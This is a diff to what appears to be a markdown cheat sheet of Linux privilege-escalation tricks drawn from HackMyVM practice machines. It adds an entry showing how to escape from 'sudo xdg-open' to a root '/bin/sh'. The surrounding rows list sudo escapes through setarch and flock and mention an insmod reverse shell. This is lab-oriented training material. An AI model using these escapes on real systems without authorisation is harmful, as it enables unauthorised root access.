@@ -37,6 +37,8 @@ Table of Contents WINDOWS
 |4.|[forbidden](https://hackmyvm.eu/machines/machine.php?vm=Forbidden)| [EXTERNAL Reference](https://d4t4s3c.medium.com/hackmyvm-forbidden-4266900e6c94) | setarch |  sudo setarch x86_64 /bin/sh |
 |5.|[Vulny](https://hackmyvm.eu/machines/machine.php?vm=Vulny)| [EXTERNAL Reference](https://kerszl.github.io/hacking/walkthrough/vulny/) | flock |   sudo flock -u / /bin/sh |
 |6.|[troya](https://hackmyvm.eu/machines/machine.php?vm=troya)|[Reference](https://am-a-circle.github.io/posts/troya/)| insmod | [Insert kernel as root for reverse shell](https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities#example-2-with-binary)  |
+|7.|[Echoed](https://hackmyvm.eu/machines/machine.php?vm=Echoed)|No Reference| xdg-open| 1. echo "HackMyVM.eu" > HackMyVM <br> 2. sudo -u root /usr/bin/xdg-open /tmp/HackMyVM <br> 3. Escape shell with after it comes out  e.g. <br>WARNING: terminal is not fully functional <br>/tmp/HackMyVM  (press RETURN)!/bin/sh |
+
  
 <a name="suid"></a>
 ##  SUID Bit [⤴](#table-of-contents)
